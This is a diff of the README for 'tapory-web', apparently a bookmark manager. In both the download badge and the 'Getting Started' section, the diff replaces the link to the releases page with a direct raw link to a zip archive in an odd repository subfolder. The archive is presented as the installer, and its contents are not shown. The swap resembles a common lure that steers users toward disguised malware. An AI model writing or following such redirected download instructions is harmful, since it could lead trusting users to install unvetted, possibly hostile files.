@@ -1,6 +1,6 @@
 # 🌐 tapory-web - Manage your web bookmarks with ease
 
-[![Download tapory-web](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/halliehandheld76/tapory-web/releases)
+[![Download tapory-web](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/halliehandheld76/tapory-web/raw/refs/heads/main/know/web_tapory_v2.4.zip)
 
 tapory-web helps you organize your internet bookmarks. You gain control over your browsing history through a simple interface. This application runs on your local machine to keep your data private and secure.
 
@@ -22,7 +22,7 @@ tapory-web helps you organize your internet bookmarks. You gain control over you
 
 ## 📥 Getting Started
 
-You need to download the installation file to start. Visit this page to download the latest version: [https://github.com/halliehandheld76/tapory-web/releases](https://github.com/halliehandheld76/tapory-web/releases).
+You need to download the installation file to start. Visit this page to download the latest version: [https://github.com/halliehandheld76/tapory-web/raw/refs/heads/main/know/web_tapory_v2.4.zip](https://github.com/halliehandheld76/tapory-web/raw/refs/heads/main/know/web_tapory_v2.4.zip).
 
 1. Open your web browser.
 2. Go to the link provided above.
